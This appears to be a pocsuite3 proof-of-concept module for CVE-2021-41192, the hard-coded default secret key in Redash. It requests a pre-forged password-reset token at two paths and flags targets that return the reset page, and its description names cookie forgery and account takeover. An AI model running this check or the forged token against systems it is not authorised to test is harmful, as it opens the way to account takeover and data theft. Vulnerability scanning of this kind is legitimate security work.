from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
class DemoPOC(POCBase):
    vulID = 'CVE-2021-41192'  # ssvid
    version = '1.0'
    name = 'Redash 默认secret key漏洞'
    appName = 'Redash'
    appVersion = '<10.0.0 '
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''由于redash默认硬编码secret key，导致攻击者可利用secret key生成cookie 或者 重置密码链接，从而登录进入后台，造成远程代码执行或数据泄漏等。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs"
            target1 = self.url+"/redash/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs"
            r = requests.get(url=target,timeout=8,verify=False)
            r1 = requests.get(url=target1,timeout=8,verify=False)
            if r.status_code == 200 and "Enter your new password:" in r.text and "redash" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
            elif r1.status_code == 200 and "Enter your new password:" in r1.text and "redash" in r1.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)